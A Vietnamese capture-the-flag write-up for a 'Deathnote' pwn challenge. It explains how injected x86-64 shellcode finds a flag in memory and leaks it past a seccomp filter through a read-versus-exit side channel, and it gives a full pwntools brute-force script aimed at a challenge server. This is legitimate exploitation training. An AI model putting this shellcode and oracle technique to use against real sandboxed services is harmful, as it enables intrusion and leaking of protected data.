**Write-up for week 1 tasks**
---

**1. Deathnote-challenge:**
* Nhìn sơ qua, challenge sẽ cho ta thao tác trên Ryuk bash:
    * ![image](https://hackmd.io/_uploads/H1eV6d89T.png)
* Qua kiểm tra thì các hàm khác bình thường, hàm cat không cat flag.txt được, chỉ có hàm loadflag và hàm exec là khả nghi
    * ![image](https://hackmd.io/_uploads/rJt06_Lca.png)

* Theo source code thì loadflag sẽ truyền flag vào mảng flag được khai báo ngoài đồng thời apply seccomp, trong đó seccomp sẽ chỉ cho phép thực hiện syscall đối với open, mmap, exit và exit_ground
    * ![image](https://hackmd.io/_uploads/By7_0_Iqa.png)

* Kết hợp điều kiện của seccomp và đọc qua hàm exec thì có thể chắc chắn rằng cách duy nhất để lấy được flag là dùng hàm exec thể inject shellcode nhưng bị giới hạn syscall chỉ được read, exit và exit_ground

* Sau khi thử nhiều lần thì mình đã có thể viết shellcode lấy được địa chỉ của flag cũng như có thể tự do điều khiển chương trình theo ý muốn dù có aslr thông qua con trỏ chương trình đặt ở đầu stack khi exec shellcode và việc vị trí tương đối của address flag và address lưu tại rsp là không đổi
    * ![image](https://hackmd.io/_uploads/SkvaJt89T.png)

* Tuy nhiên còn một vấn đề nữa là dù mình xác định được địa chỉ của flag, biết nội dung của flag trên remote nhưng seccomp đã chặn khiến mình không thể lấy được dữ liệu về, vậy nên được gợi ý, mình dùng true false attack để bruteforce flag
    * Đối với challenge này tuy đã chặn syscall write để có thể lấy dữ liệu nhưng vẫn còn một cách để ta xác định xem liệu char mình brute có đúng hay không. Vì nếu như session ended thì ta có thể kiểm tra được bằng việc thử nhận dữ liệu từ session, nếu có thể nhận thì session chưa ended, nếu không thì session đã ended.
    * Lợi dụng điều này, trong shellcode của mình sẽ kiểm tra xem char mình brute có giống với char của flag hay không, nếu có thì sẽ syscall read để session có thể đợi nhận dữ liệu, còn nếu không thì sẽ syscall exit để session ended, từ đó có thể true false attack được

Đây là payload mình dùng để bruteforce:``Đã cập nhật lại code tối ưu thời gian chạy``
* Tối ưu bằng chặt nhị phân
    * Ở đây vì mình có thể biết char brute lớn hơn hay nhỏ hơn char flag, nên có thể đặt điều kiện so sánh giữa char brute với char flag làm điều kiện chẻ, từ đó có thể dùng chặt nhị phân để giảm thời gian bruteforce
```python!
from pwn import *
#Vì để tránh null byte nên mình sẽ xor các giá trị với 0xffffffffffffffff trong thanh ghi sau đó xor lại lần nữa 

#Khởi tạo địa chỉ của flag, sau khi add rbx, rax thì rbx chứa địa chỉ của flag
flag_add = asm('''
                mov rbx, QWORD PTR [rsp]
                mov rax, 0xffffffffffffd4c5
                xor rax, 0xffffffffffffffff
                add rbx, rax
''', arch= 'amd64', os='linux')

#Khởi tạo thanh ghi để call read với rax là địa chỉ của hàm read, rdi = 0 (từ stdin) và rsi là địa chỉ ghi vào còn rdx là số kí tự
init = asm('''
                mov rax, rbx
                add rax, 0xffffffffffffd120
                xor rdi, rdi
                mov rsi, rbx
                add rsi, 0xffffffffffffd1b0
                mov rdx, 0xffffffffffffffff
                xor rdx, 0xffffffffffffffb0
''', arch = 'amd64', os = 'linux')

#Khởi tạo rdx, rcx trước khi xor, trong đó rdx sẽ là char brute j, rcx sẽ là char flag
setup1 = asm('''
                    mov rdx, 0xffffffffffffffff
                    mov rcx, 0xffffffffffffffff
''', arch = 'amd64', os = 'linux')

#Kết thúc xor và đưa char flag vào rcx
setup3 = asm('''
                    add rcx, rbx
                    mov rcx, qword ptr[rcx]
''', arch = 'amd64', os = 'linux')

#Điều kiện chẻ để call read hay exit: nếu char brute j <= char flag thì sẽ call read để hàm check return true, nếu không call exit() để hàm check chạy except return false
#Vì nếu rax đã được khởi tạo là địa chỉ của hàm read, nếu như true thì chỉ việc call, còn không thì sẽ đổi lại để rax là địa chỉ của hàm exit rồi mới call
call_exit = asm('''
                cmp cl, dl
                jge end
                mov rax, rbx
                add rax, 0xffffffffffffd1b0
                jmp end
                nop
                end:
                    call rax
''', arch = 'amd64', os = 'linux')

flag = []
set2_1 = [] #Mảng prebuild shellcode xor để đưa char brute j vào shellcode
set2_2 = [] #Mảng prebuild shellcode xor để đưa vị trí brute i vào shellcode

#Do i, i + 1 khi xor với 0xff sẽ thành 0xf(f - i), 0x(f - i - 1) nên mình set set_2[i] = set_2[i - 1] - 1

#Khởi tạo mảng prebuild shellcode xor char j
for j in range(0, 32):
    set2_1.append('')
set2_1.append(asm("xor rdx, " + hex(32 ^ 0xffffffffffffffff), arch = 'amd64', os = 'linux'))
for j in range(33, 128):
    set2_1.append(bytes.fromhex((hex(int(set2_1[j - 1].hex(), 16) - 1)[2::])))

#Khởi tạo mảng prebuild shellcode xor vị trí i
set2_2.append(asm("xor rcx, " + hex(0 ^ 0xffffffffffffffff), arch = 'amd64', os = 'linux'))
for i in range(0, 0x32):
    flag.append('')
    if(i == 0):
        continue
    set2_2.append(bytes.fromhex((hex(int(set2_2[i - 1].hex(), 16) - 1)[2::])))

#Hàm kiểm tra tại vị trí i char brute j với char flag
def check(i, j):
    setup2 = set2_1[j]
    setup2 += set2_2[i]
    with remote("18.136.148.247", 14257) as chall:
        chall.sendlineafter(b'note$ ', b'loadflag')
        chall.sendline(b'exec ' + flag_add + init + setup1 + setup2 + setup3 + call_exit)
        try:
            chall.recv(timeout = 0.1)
        except:
            return 0
    return 1

#Chặt nhị phân char brute tại vị trí k, nếu char brute <= char flag thì true, ngược lại false
def brute(k):
    l = 32
    r = 127
    m = int((l + r) / 2)
    while(1):
        if (check(k, m) == 1):
            l = m
        else:
            r = m
        m = int((l + r) / 2)
        if(l == m): 
            break
        if(r == m):
            break
    if(check(k, r)):
        return chr(r)
    return chr(l)

for i in range(0, 0xff):
    flag[i] = brute(i)
    if(flag[i] == '}'):
        break

#In flag
for i in range(0, 0xff):
    print(flag[i], end='')
    if(flag[i] == '}'):
        break
```
=> Flag: `kira{https://www.youtube.com/watch?v=tAMhUyLwD4k}`